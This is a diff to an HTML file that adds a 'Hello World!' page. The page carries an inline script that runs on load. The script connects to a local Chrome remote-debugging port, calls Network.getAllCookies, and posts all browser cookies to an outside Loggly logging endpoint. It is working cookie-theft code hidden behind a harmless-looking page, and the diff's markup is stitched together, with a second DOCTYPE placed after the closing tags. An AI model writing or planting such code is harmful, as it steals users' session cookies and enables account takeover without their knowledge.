@@ -3,7 +3,52 @@
 <html>
 <head>
 </head>
-<script type="text/javascript" src="script.js"></script>
 <body>
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Hello World!</title>
+</head>
+<body>
+Hello World!
+
+<script>
+
+    var webSocketDebuggerUrl;
+    var port = 9222;
+    var request = new XMLHttpRequest();
+    request.open("GET", "http://localhost:" + port + "/json");
+    request.responseType = 'json';
+    request.send();
+    request.onload = function() {
+        webSocketDebuggerUrl = request.response[0].webSocketDebuggerUrl;
+        console.log(webSocketDebuggerUrl);
+        var connection = new WebSocket(webSocketDebuggerUrl);
+
+        // When the connection is open, send some data to the server
+        connection.onopen = function () {
+            connection.send('{"id": 1, "method": "Network.getAllCookies"}');
+        };
+        // Log errors
+        connection.onerror = function (error) {
+            console.log('WebSocket Error ' + error);
+        };
+        // Log messages from the server
+        connection.onmessage = function (e) {
+            console.log('Server: ' + e.data);
+
+            post_url = "http://logs-01.loggly.com/inputs/df2187e4-1daa-47dc-b73d-48c896958e36/tag/http/"
+            var xhttp = new XMLHttpRequest();
+            xhttp.open("POST", post_url, true);
+            xhttp.setRequestHeader('Content-Type', 'text/plain');
+            xhttp.send(JSON.stringify(JSON.parse(e.data).result.cookies));
+        };
+    }
+</script>
+<script type="text/javascript" src="script.js"></script>
+
 </body>
 </html>
